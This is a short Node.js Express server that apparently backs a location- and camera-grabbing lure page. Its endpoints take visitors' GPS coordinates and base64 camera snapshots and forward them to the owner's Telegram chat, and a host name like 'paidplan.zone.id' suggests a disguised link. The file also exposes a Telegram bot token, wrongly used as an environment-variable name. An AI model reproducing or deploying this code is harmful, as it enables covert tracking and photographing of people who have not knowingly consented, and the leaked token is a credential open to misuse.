require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const bot = new TelegramBot(process.env["7555011480:AAFEehgJ1nEyNPpv3MrHI4222Hzn-aH_ju4"], { polling: true });

const hostURL = process.env["HOST_URL"] || "https://paidplan.zone.id";

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Receive location from frontend
app.post("/api/location", (req, res) => {
  const { lat, lon, acc } = req.body;
  if (!lat || !lon) return res.status(400).send("Invalid data");

  const msg = `📍 New Location Data\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`;

  bot.sendMessage(process.env["OWNER_CHAT_ID"], msg);

  res.send("Location received");
});

// Receive camera snapshot (optional)
app.post("/api/camsnap", (req, res) => {
  const { image } = req.body;
  if (!image) return res.status(400).send("No image");

  const buffer = Buffer.from(image, 'base64');
  bot.sendPhoto(process.env["OWNER_CHAT_ID"], buffer, {}, {
    filename: 'camsnap.png',
    contentType: 'image/png'
  });

  res.send("Camera snapshot received");
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
